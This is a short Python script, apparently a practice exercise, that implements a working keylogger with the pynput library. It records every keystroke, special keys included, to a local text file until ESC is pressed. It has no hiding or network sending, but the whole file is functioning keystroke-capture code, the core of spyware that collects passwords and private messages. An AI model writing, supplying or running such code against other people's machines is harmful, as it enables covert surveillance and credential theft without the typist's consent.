from pynput import keyboard

# File where keystrokes will be saved
log_file = "D:/Python materials/python practice/kl/keylog.txt"

# Function that runs every time a key is pressed
def on_press(key):
    try:
        # Try to get the character for normal keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # If it's a special key (like space, enter, etc.), write it in brackets
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# Function that runs every time a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if ESC key is pressed
        print("ESC key pressed. Exiting keylogger.")
        return False

# Setup the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Written by: Gowsik Raja.S